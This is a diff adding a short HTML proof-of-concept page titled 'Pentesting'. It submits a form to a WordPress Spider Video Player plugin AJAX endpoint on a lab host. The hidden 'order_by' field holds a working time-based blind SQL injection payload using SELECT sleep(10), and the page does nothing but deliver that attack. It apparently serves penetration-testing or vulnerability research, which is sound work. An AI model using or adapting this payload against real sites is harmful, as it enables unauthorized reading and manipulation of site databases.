@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Pentesting</title>
+    <head>
+    <body>
+        <form action="http://wpdistillery.vm/wp-admin/admin-ajax.php?action=spiderVeideoPlayerselectplaylist" method="POST">
+            <input type="hidden" name="search_events_by_title" value="" />
+            <input type="hidden" name="page_number" value="0" />
+            <input type="hidden" name="serch_or_not" value="" />
+            <input type="hidden" name="asc_or_desc" value="1" />
+            <input type="hidden" name="order_by" value="(CASE WHEN (SELECT sleep(10)) = 1 THEN id ELSE title END) ASC #" />
+            <input type="hidden" name="option" value="com_Spider_Video_Player" />
+            <input type="hidden" name="task" value="select_playlist" />
+            <input type="hidden" name="boxchecked" value="0" />
+            <input type="hidden" name="filter_order_playlist" value="" />
+            <input type="hidden" name="filter_order_Dir_playlist" value="" />
+            <input type="submit" value="Submit request" />
+        </form>
+    </body>
+</html>
